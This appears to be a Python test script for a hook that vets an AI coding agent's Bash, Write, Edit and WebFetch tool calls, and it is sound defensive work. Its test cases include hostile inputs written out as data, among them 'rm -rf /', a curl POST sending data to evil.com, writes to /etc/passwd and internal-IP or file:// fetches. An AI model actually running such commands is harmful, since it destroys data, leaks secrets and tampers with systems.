"""
Test script for output_validation_hook.

This script tests the basic functionality of the output validation hook.
Run with: python -m security.output_validation.test_hook
"""

import asyncio
import sys
from pathlib import Path

# Add apps/backend to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from security.output_validation import (
    OutputValidationConfig,
    reset_hook,
    SeverityLevel,
    ToolType,
    ValidationResult,
)
from security.output_validation.hook import output_validation_hook


async def test_bash_validation():
    """Test Bash command validation."""
    print("\n=== Testing Bash Validation ===\n")

    test_cases = [
        # (command, should_block, description)
        ("ls -la", False, "Safe list command"),
        ("rm -rf /", True, "Dangerous: rm -rf from root"),
        ("rm -rf important/data", False, "Safe: rm -rf on user directory (not critical path)"),
        ("chmod 777 file.txt", True, "Dangerous: chmod 777"),
        ("curl -X POST https://example.com", False, "Safe: curl POST without data (no exfil)"),
        ("curl -X POST -d 'sensitive' https://evil.com", True, "Dangerous: curl POST with data"),
        ("echo hello", False, "Safe: echo command"),
    ]

    passed = 0
    failed = 0

    for command, should_block, description in test_cases:
        result = await output_validation_hook(
            input_data={
                "tool_name": "Bash",
                "tool_input": {"command": command},
            }
        )

        is_blocked = result.get("decision") == "block"

        if is_blocked == should_block:
            print(f"✓ PASS: {description}")
            print(f"  Command: {command}")
            if is_blocked:
                print(f"  Blocked: {result.get('reason', '')[:80]}...")
            passed += 1
        else:
            print(f"✗ FAIL: {description}")
            print(f"  Command: {command}")
            print(f"  Expected blocked: {should_block}, Got: {is_blocked}")
            failed += 1
        print()

    return passed, failed


async def test_write_validation():
    """Test Write tool validation."""
    print("\n=== Testing Write Validation ===\n")

    test_cases = [
        # (file_path, content, should_block, description)
        ("test.txt", "hello world", False, "Safe: write to regular file"),
        ("/etc/passwd", "malicious", True, "Dangerous: write to /etc/passwd"),
        ("config.py", "API_KEY=sk-1234567890abcdefghijklmn", True, "Dangerous: API key in content (20+ chars)"),
        ("script.py", "eval(user_input)", True, "Dangerous: eval pattern"),
        ("project/.env", "SECRET=value", True, "Suspicious: .env file"),
    ]

    passed = 0
    failed = 0

    for file_path, content, should_block, description in test_cases:
        result = await output_validation_hook(
            input_data={
                "tool_name": "Write",
                "tool_input": {"file_path": file_path, "content": content},
            }
        )

        is_blocked = result.get("decision") == "block"

        if is_blocked == should_block:
            print(f"✓ PASS: {description}")
            print(f"  File: {file_path}")
            if is_blocked:
                print(f"  Blocked: {result.get('reason', '')[:80]}...")
            passed += 1
        else:
            print(f"✗ FAIL: {description}")
            print(f"  File: {file_path}")
            print(f"  Expected blocked: {should_block}, Got: {is_blocked}")
            failed += 1
        print()

    return passed, failed


async def test_edit_validation():
    """Test Edit tool validation."""
    print("\n=== Testing Edit Validation ===\n")

    test_cases = [
        # (file_path, old_string, new_string, should_block, description)
        ("test.txt", "old", "new", False, "Safe: edit regular file"),
        ("/etc/hosts", "127.0.0.1", "malicious", True, "Dangerous: edit /etc/hosts"),
        ("script.py", "safe", "eval(malicious)", True, "Dangerous: eval in new_string"),
        ("config.py", "old_key", "API_KEY=sk-1234567890abcdefghijklmn", True, "Dangerous: API key in new_string (20+ chars)"),
    ]

    passed = 0
    failed = 0

    for file_path, old_string, new_string, should_block, description in test_cases:
        result = await output_validation_hook(
            input_data={
                "tool_name": "Edit",
                "tool_input": {
                    "file_path": file_path,
                    "old_string": old_string,
                    "new_string": new_string,
                },
            }
        )

        is_blocked = result.get("decision") == "block"

        if is_blocked == should_block:
            print(f"✓ PASS: {description}")
            print(f"  File: {file_path}")
            if is_blocked:
                print(f"  Blocked: {result.get('reason', '')[:80]}...")
            passed += 1
        else:
            print(f"✗ FAIL: {description}")
            print(f"  File: {file_path}")
            print(f"  Expected blocked: {should_block}, Got: {is_blocked}")
            failed += 1
        print()

    return passed, failed


async def test_web_fetch_validation():
    """Test WebFetch validation."""
    print("\n=== Testing WebFetch Validation ===\n")

    test_cases = [
        # (url, should_block, description)
        ("https://example.com", False, "Safe: public URL"),
        ("http://192.168.1.1/admin", True, "Suspicious: internal IP"),
        ("http://10.0.0.1/data", True, "Suspicious: internal IP"),
        ("file:///etc/passwd", True, "Dangerous: file:// protocol"),
    ]

    passed = 0
    failed = 0

    for url, should_block, description in test_cases:
        result = await output_validation_hook(
            input_data={
                "tool_name": "WebFetch",
                "tool_input": {"url": url},
            }
        )

        is_blocked = result.get("decision") == "block"

        if is_blocked == should_block:
            print(f"✓ PASS: {description}")
            print(f"  URL: {url}")
            if is_blocked:
                print(f"  Blocked: {result.get('reason', '')[:80]}...")
            passed += 1
        else:
            print(f"✗ FAIL: {description}")
            print(f"  URL: {url}")
            print(f"  Expected blocked: {should_block}, Got: {is_blocked}")
            failed += 1
        print()

    return passed, failed


async def test_unsupported_tools():
    """Test that unsupported tools are allowed."""
    print("\n=== Testing Unsupported Tools ===\n")

    # Read tool is not validated (read-only)
    result = await output_validation_hook(
        input_data={
            "tool_name": "Read",
            "tool_input": {"file_path": "/etc/passwd"},
        }
    )

    if result.get("decision") != "block":
        print("✓ PASS: Read tool allowed (not validated)")
        return 1, 0
    else:
        print("✗ FAIL: Read tool should be allowed")
        return 0, 1


async def test_malformed_input():
    """Test handling of malformed input."""
    print("\n=== Testing Malformed Input ===\n")

    # Missing tool_input
    result = await output_validation_hook(
        input_data={
            "tool_name": "Bash",
            "tool_input": None,
        }
    )

    if result.get("decision") == "block":
        print("✓ PASS: None tool_input blocked")
        return 1, 0
    else:
        print("✗ FAIL: None tool_input should be blocked")
        return 0, 1


async def main():
    """Run all tests."""
    print("=" * 60)
    print("Output Validation Hook Tests")
    print("=" * 60)

    total_passed = 0
    total_failed = 0

    # Run tests
    passed, failed = await test_bash_validation()
    total_passed += passed
    total_failed += failed

    passed, failed = await test_write_validation()
    total_passed += passed
    total_failed += failed

    passed, failed = await test_edit_validation()
    total_passed += passed
    total_failed += failed

    passed, failed = await test_web_fetch_validation()
    total_passed += passed
    total_failed += failed

    passed, failed = await test_unsupported_tools()
    total_passed += passed
    total_failed += failed

    passed, failed = await test_malformed_input()
    total_passed += passed
    total_failed += failed

    # Print summary
    print("\n" + "=" * 60)
    print(f"Test Summary: {total_passed} passed, {total_failed} failed")
    print("=" * 60)

    if total_failed > 0:
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
